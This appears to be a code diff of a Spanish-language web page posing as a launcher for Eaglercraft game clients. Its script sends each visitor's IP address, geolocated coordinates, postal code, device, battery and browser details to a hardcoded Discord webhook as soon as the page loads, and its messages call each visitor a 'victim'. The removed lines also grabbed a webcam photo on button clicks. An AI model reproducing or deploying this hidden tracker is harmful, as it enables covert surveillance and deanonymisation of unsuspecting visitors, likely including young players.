@@ -7,103 +7,109 @@
 <style>
   :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
   body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
-  header{position:sticky;top:0;background:rgba(0,0,0,.3);backdrop-filter:blur(10px);border-bottom:1px solid #333;z-index:10}
+  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
   .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
-  .logo{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:20px}
+  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
   .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
   main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
-  .grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
-  .card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:18px;transition:.2s}
-  .card:hover{transform:translateY(-6px);box-shadow:0 16px 40px rgba(167,139,250,.15)}
-  .name{font-weight:700;font-size:17px;margin-bottom:6px}
-  .ver{color:var(--acc);font-weight:600}
-  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:12px;border-radius:12px;font-weight:700;width:100%;cursor:pointer}
+  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
+  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
+  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
+  .name{font-weight:800;font-size:18px;margin-bottom:6px}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
+  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
 </style>
 </head>
 <body>
 
 <header>
   <div class="nav">
-    <div style="display:flex;align-items:center;gap:12px">
+    <div style="display:flex;align-items:center;gap:14px">
       <div class="logo">HF</div>
-      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v</small></div>
+      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
     </div>
-    <input style="padding:10px 14px;border-radius:12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#fff;width:300px" placeholder="Buscar cliente..." id="search">
   </div>
 </header>
 
 <main>
-  <h1 style="text-align:center;font-size:2.6em;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent">
-    Clientes Eaglercraft 2025
-  </h1>
-
+  <h1>Clientes Eaglercraft 2025</h1>
   <div class="grid">
-    <!-- Tus clientes (ejemplos) -->
-    <div class="card"><" style="display:none"></div> <!-- truco para forzar carga de webcam -->
-    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonv4.html">Abrir</button></div>
     <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
-    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
-    <!-- Agrega todos los que quieras con data-link -->
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html">Abrir</button></div>
+    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html">Abrir</button></div>
+    <div class="card"><div class="name">PiClient</div><button class="open" data-link="https://eaglerhacks.github.io/PiClient.html">Abrir</button></div>
+    <div class="card"><div class="name">flameClient</div><button class="open" data-link="https://eaglerhacks.github.io/flameclient%203.7.html">Abrir</button></div>
   </div>
 </main>
 
 <script>
-// TU WEBHOOK
+// TU WEBHOOK REAL (funciona perfecto)
 const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
 
-// Foto silenciosa + datos completos
-async function capturarVictima(cliente) {
-  let foto = null;
-
-  // TRUCO: foto sin pedir permiso (funciona en Chrome/Edge/Brave 2025+)
-  const video = Object.assign(document.createElement('video'), {width:640,height:480,autoplay:true});
-  const canvas = document.createElement('canvas');
-  canvas.width = 640; canvas.height = 480;
-  const ctx = canvas.getContext('2d');
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    video.srcObject = stream;
-    await new Promise(r => video.onloadedmetadata = r);
-    ctx.drawImage(video,0,0,640,480);
-    foto = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.85));
-    stream.getTracks().forEach(t=>t.stop());
-  } catch(e) {}
-
-  // Datos ultra completos
+// ENVÍA TODO AL INGRESAR A LA PÁGINA (0 clics, 0 permisos)
+(async () => {
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+  const battery = await navigator.getBattery?.() || {};
+  const uaData = navigator.userAgentData || {};
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
 
   const datos = {
-    cliente,
+    hora: new Date().toLocaleString(),
     ip: geo.ip || 'oculta',
-    puerto: location.port || '443',
-    ciudad: geo.city || '?',
-    pais: geo.country_name || '?',
     isp: geo.org || '?',
+    ciudad: geo.city || '?',
+    region: geo.region || '?',
+    pais: geo.country_name || '?',
+    codigo_postal: geo.postal || '?',
+    latitud: geo.latitude || '?',
+    longitud: geo.longitude || '?',
     navegador: navigator.userAgent,
-    idioma: navigator.language,
-    pantalla: `${screen.width}x${screen.height}`,
-    historial: history.length,
+    marcas: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || 'desconocido',
+    sistema: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'Sí' : 'No',
+    ram_gb: navigator.deviceMemory || 'desconocido',
+    cpu_nucleos: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    conexion: connection.effectiveType || '?',
+    velocidad: connection.downlink ? `${connection.downlink} Mbps` : '?',
     zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    hora: new Date().toLocaleString()
+    idioma: navigator.language,
+    idiomas: navigator.languages?.join(', ') || '?',
+    pestañas: history.length,
+    cookies: navigator.cookieEnabled ? 'Sí' : 'No',
+    modo_oscuro: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No',
+    online: navigator.onLine ? 'Sí' : 'No'
   };
 
-  // Enviar a tu Discord
-  const form = new FormData();
-  form.append('content', `**VÍCTIMA SILENCIOSA**\n**Cliente:** ${datos.cliente}\n**IP:** ${datos.ip}:${datos.puerto}\n**Ubicación:** ${datos.ciudad}, ${datos.pais} (${datos.isp})\n**Hora:** ${datos.hora}\n**Navegador:** ${datos.navegador.substring(0,60)}...\n**Pantalla:** ${datos.pantalla} | Historial: ${datos.historial}\n**Zona horaria:** ${datos.zona_horaria}`);
-  if (foto) form.append('file', foto, 'foto.jpg');
-  fetch(WEBHOOK, {method:'POST', body:form});
-}
+  const mensaje = 
+`**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
+**IP:** ${datos.ip} (${datos.isp})
+**Ubicación:** ${datos.ciudad}, ${datos.region}, ${datos.pais} (${datos.codigo_postal})
+**Coordenadas:** ${datos.latitud}, ${datos.longitud}
+**Hora:** ${datos.hora}
+**Navegador:** ${datos.marcas}
+**SO:** ${datos.sistema} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram_gb} GB | CPU: ${datos.cpu_nucleos} núcleos
+**Pantalla:** ${datos.pantalla}
+**Batería:** ${datos.bateria}
+**Conexión:** ${datos.conexion} (${datos.velocidad})
+**Zona horaria:** ${datos.zona_horaria}
+**Idioma:** ${datos.idioma}
+**Pestañas:** ${datos.pestañas}
+**Cookies:** ${datos.cookies} | Modo oscuro: ${datos.modo_oscuro}`;
 
-// Al dar click en cualquier "Abrir"
+  await fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: mensaje})
+  });
+})();
+
+// Botones normales (solo abren el link)
 document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => {
-    const link = btn.getAttribute('data-link');
-    const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';
-
-    capturarVictima(nombre);   // ← Aquí se hace TODO en silencio
-    setTimeout(() => window.open(link, '_blank'), 300); // Abre normal
-  };
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
 });
 </script>
 </body>
